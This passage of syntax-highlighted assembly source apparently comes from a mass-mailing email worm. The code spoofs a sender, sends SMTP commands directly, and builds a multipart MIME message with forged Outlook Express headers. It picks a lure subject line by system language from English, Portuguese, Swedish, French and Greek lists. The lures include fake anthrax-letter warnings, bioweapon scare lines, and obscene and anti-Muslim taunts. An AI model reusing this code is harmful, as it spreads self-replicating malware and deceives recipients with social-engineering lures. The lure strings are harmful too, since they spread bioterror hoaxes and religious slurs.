</span><span class="sc5">rnd_server</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">helo_sz</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heloserver</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">heloserver_after</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc1">;  sending rnd hotmail user (debug version)</span><span class="sc0">

</span><span class="sc1">;            call rnd_eax</span><span class="sc0">
</span><span class="sc1">;            and eax, 0f0f0f0fh</span><span class="sc0">
</span><span class="sc1">;            add eax, 'aaaa'</span><span class="sc0">
</span><span class="sc1">;            mov dword ptr [rnd_usr], eax</span><span class="sc0">
</span><span class="sc1">;            neg eax</span><span class="sc0">
</span><span class="sc1">;            and eax, 0f0f0f0fh</span><span class="sc0">
</span><span class="sc1">;            add eax, 'aaaa'</span><span class="sc0">
</span><span class="sc1">;            mov dword ptr [offset rnd_usr+4], eax</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rnd_usr_len</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_rnd_usr</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv_x</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_rnd_usr_after</span><span class="sc0">

</span><span class="sc5">_rnd_usr</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MAIL FROM: &lt;'</span><span class="sc0"> 
</span><span class="sc5">rnd_usr</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'root@fun.com&gt;'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">rnd_usr_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_rnd_usr</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">_rnd_usr_after</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc1">;  sending recipient</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rcpt_</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RCPT TO: &lt;'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">rcpt_</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rcpt</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServerSMTP</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rcpt</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rcpt_2</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&gt;'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">rcpt_2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rcpt</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rcpt</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">

            </span><span class="sc1">;  EAX=sIzE</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rcpt</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv_x</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__data</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv_x</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__data_after</span><span class="sc0">

</span><span class="sc5">__data</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">__data_after</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LangID</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LANG_PORTUGUESE</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FrasePort</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LANG_SWEDISH</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FraseSwedis</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LANG_FRENCH</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FraseFrench</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LANG_GREEK</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FraseGreek</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_sbjt</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eng_subject1</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eng_subject2</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eng_subject3</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eng_subject4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eng_subject5</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eng_subject6</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eng_subject7</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eng_subject8</span><span class="sc0">

</span><span class="sc5">FraseFrench</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_sbjt</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fre_subject1</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fre_subject2</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fre_subject3</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fre_subject4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fre_subject5</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fre_subject6</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fre_subject7</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fre_subject8</span><span class="sc0">

</span><span class="sc5">FraseSwedis</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_sbjt</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swe_subject1</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swe_subject2</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swe_subject3</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swe_subject4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swe_subject5</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swe_subject6</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swe_subject7</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swe_subject8</span><span class="sc0">

</span><span class="sc5">FrasePort</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_sbjt</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">por_subject1</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">por_subject2</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">por_subject3</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">por_subject4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">por_subject5</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">por_subject6</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">por_subject7</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">por_subject8</span><span class="sc0">

</span><span class="sc5">FraseGreek</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_sbjt</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gre_subject1</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gre_subject2</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gre_subject3</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gre_subject4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gre_subject5</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gre_subject6</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gre_subject7</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gre_subject8</span><span class="sc0">

</span><span class="sc5">eng_subject1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bin Laden toillete paper !!     '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">eng_subject2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sadam hussein &amp; BinLaden IN LOVE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">eng_subject3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bush fucks Bin Laden hardly &lt;:P '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">eng_subject4</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Is Osama Bin Laden BAD-LOVED ?  '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">eng_subject5</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USA against Geneva Convention ? '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">eng_subject6</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Anthrax mail is true(not a joke)'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">eng_subject7</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Biological weapons: Preventing !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">eng_subject8</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Fucking a mullah in Islamabad   '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">por_subject1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'O papel higienico do Bin Laden !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">por_subject2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sadam e BinLaden apaixonados    '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">por_subject3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bush fudendo Bin Laden  &lt;:P     '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">por_subject4</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Ser que o Osama  mal-amado ?  '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">por_subject5</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'EUA agride convenao de genova ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">por_subject6</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Antraz pelo correio (verdade)   '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">por_subject7</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Armas biologicas: Previna-se !  '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">por_subject8</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Fudendo um mul em Islamabad  '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">swe_subject1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bin Landen Toalettpapper        '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">swe_subject2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sadam hussein &amp; BinLaden r frlskade'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">swe_subject3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bush knullar Bin Laden hrt &lt;:P '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">swe_subject4</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'r Osama Bin Laden inte lskad ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">swe_subject5</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'r USA emot Geneve verenskommelsen ? '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">swe_subject6</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Anthrax brevet existerar(det r inget skmt)'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">swe_subject7</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Biologiska vapen: Frhindra !   '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">swe_subject8</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Knulla en muslim i Islamabad    '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fre_subject1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'papier toillette Bin Laden      '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fre_subject2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sadam &amp; BinLaden EN AMOUR       '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fre_subject3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bush nique  donf Bin Laden &lt;:P '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fre_subject4</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Osama Bin Laden Mal Aim ?      '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fre_subject5</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Usa contre la convention de Geneve?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fre_subject6</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Le courrier Anthrax existe vraiment'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fre_subject7</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Arme Biologique: Prventions!   '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fre_subject8</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Baiser un mullah  Islamabad    '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">gre_subject1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Xarti toualetas Bin Landen !!  '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gre_subject2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Hussein &amp; Bin Laden, ERASTES   '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gre_subject3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'O Bush gamaei agria ton Bin Laden'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gre_subject4</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Einai o Osama apotuximenos ston erwta?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gre_subject5</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Amerikh enantia sto synedrio tis Genova?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gre_subject6</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'H epistoles me Antraka,einai gegonos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gre_subject7</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Biologika wpla: Prostasia !    '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gre_subject8</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Gamontas ena Moula sto Islamabad'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">choose_sbjt</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+(</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">subject</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">copy_subjct</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">copy_ok</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">copy_subjct</span><span class="sc0">
</span><span class="sc5">copy_ok</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_boundary</span><span class="sc0">

</span><span class="sc5">boundarywww</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Subject: '</span><span class="sc0">
</span><span class="sc5">subject</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">46</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: multipart/mixed;'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
</span><span class="sc5">boundary0</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'boundary="----=_NextPart_000_0009_01C154DE.24E75DA0'</span><span class="sc0">
</span><span class="sc5">boundary0sz</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boundary0</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-Priority: 3'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-MSMail-Priority: Normal'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-Mailer: Microsoft Outlook Express 5.00.2615.200'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2615.200'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'This is a multi-part message in MIME format.'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">boundary1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'------=_NextPart_000_0009_01C154DE.24E75DA0'</span><span class="sc0">
</span><span class="sc5">boundary1sz</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boundary1</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: text/html;'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'charset="iso-8859-1"'</span><span class="sc0">
